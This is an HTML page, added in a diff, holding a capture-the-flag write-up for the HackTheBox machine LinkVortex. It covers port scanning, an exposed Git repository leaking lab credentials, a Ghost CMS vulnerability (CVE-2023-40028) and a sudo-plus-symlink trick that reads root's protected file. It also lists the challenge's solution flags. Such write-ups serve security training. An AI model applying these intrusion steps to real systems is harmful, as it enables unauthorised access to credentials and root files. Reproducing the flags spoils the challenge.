@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkVortex - HackTheBox Write-up</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            color: #333;
+        }
+        pre {
+            background-color: #f4f4f4;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        h1, h2, h3 {
+            color: #2c3e50;
+        }
+        .machine-info {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 15px 0;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .flag {
+            background-color: #e8f5e9;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎯 LinkVortex - HackTheBox Write-up</h1>
+
+    <div class="machine-info">
+        <strong>Category:</strong> Miscellaneous<br>
+        <strong>Difficulty:</strong> Easy<br>
+        <strong>Platform:</strong> HackTheBox<br>
+        <strong>Release Date:</strong> 2023<br>
+        <strong>Target IP:</strong> 10.10.11.47
+    </div>
+
+    <h2>📝 Challenge Description</h2>
+    <p>A Ghost CMS instance with potential security misconfigurations and vulnerabilities that could lead to unauthorised access.</p>
+
+    <h2>🔍 Reconnaissance</h2>
+    
+    <h3>Port Scanning</h3>
+    <pre><code># Full TCP port scan
+nmap -sC -sV -T4 -p- 10.10.11.47</code></pre>
+
+    <h4>Results:</h4>
+    <table>
+        <tr>
+            <th>Port</th>
+            <th>State</th>
+            <th>Service</th>
+            <th>Version</th>
+        </tr>
+        <tr>
+            <td>22/tcp</td>
+            <td>Open</td>
+            <td>SSH</td>
+            <td>OpenSSH 8.9p1 Ubuntu 3ubuntu0.10</td>
+        </tr>
+        <tr>
+            <td>80/tcp</td>
+            <td>Open</td>
+            <td>HTTP</td>
+            <td>Apache httpd</td>
+        </tr>
+    </table>
+
+    <h3>Web Enumeration</h3>
+    <p>Initial enumeration revealed a subdomain: <code>dev.linkvortex.htb</code></p>
+
+    <h4>Git Repository Investigation</h4>
+    <p>Found exposed Git repository at <code>dev.linkvortex.htb/.git/</code> containing sensitive information:</p>
+    <ul>
+        <li>Ghost CMS version 5.58.0 identified in Dockerfile</li>
+        <li>Exposed test credentials:
+            <ul>
+                <li>Email: <code>test@example.com</code></li>
+                <li>Password: <code>OctopiFociPilfer45</code></li>
+            </ul>
+        </li>
+    </ul>
+
+    <h2>🔓 Initial Access</h2>
+    <p>Access was gained through Ghost CMS exploitation using CVE-2023-40028. Key findings included:</p>
+    <ul>
+        <li>Valid admin email: <code>admin@linkvortex.htb</code></li>
+        <li>SMTP credentials in configuration file:
+            <ul>
+                <li>User: <code>bob@linkvortex.htb</code></li>
+                <li>Password: <code>fibber-talented-worth</code></li>
+            </ul>
+        </li>
+    </ul>
+
+    <h2>🔐 Privilege Escalation</h2>
+    <p>Privilege escalation was achieved through a sudo permission vulnerability:</p>
+    <pre><code>User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</code></pre>
+
+    <h3>Exploitation Steps:</h3>
+    <pre><code># Create symlinks
+ln -s /root/root.txt /home/bob/test.txt
+ln -s /home/bob/test.txt /home/bob/test.png
+
+# Execute exploit
+sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/test.png</code></pre>
+
+    <h2>🏁 Flags</h2>
+    <div class="flag">
+        <strong>User Flag:</strong> <code>e9e77193e25870661af3813cab24a91c</code><br>
+        <strong>Root Flag:</strong> <code>cdf8ecab5aace4312e2b04673c4fe73d</code>
+    </div>
+
+    <h2>💡 Key Takeaways</h2>
+    <ol>
+        <li>Always check for exposed Git repositories and analyze their contents</li>
+        <li>Version-specific vulnerabilities in CMS systems can be critical (Ghost CMS 5.58)</li>
+        <li>Configuration files often contain valuable credentials</li>
+        <li>Symlink attacks can be effective for privilege escalation when combined with sudo permissions</li>
+    </ol>
+
+    <h2>🛠️ Tools Used</h2>
+    <ul>
+        <li>nmap</li>
+        <li>gobuster</li>
+        <li>ffuf</li>
+        <li>git</li>
+        <li>CVE-2023-40028 exploit</li>
+        <li>Basic Linux commands (ln, sudo)</li>
+    </ul>
+
+    <h2>📚 References</h2>
+    <ul>
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40028">Ghost CMS CVE-2023-40028</a></li>
+        <li><a href="https://ghost.org/docs/">Ghost CMS Documentation</a></li>
+    </ul>
+</body>
+</html>
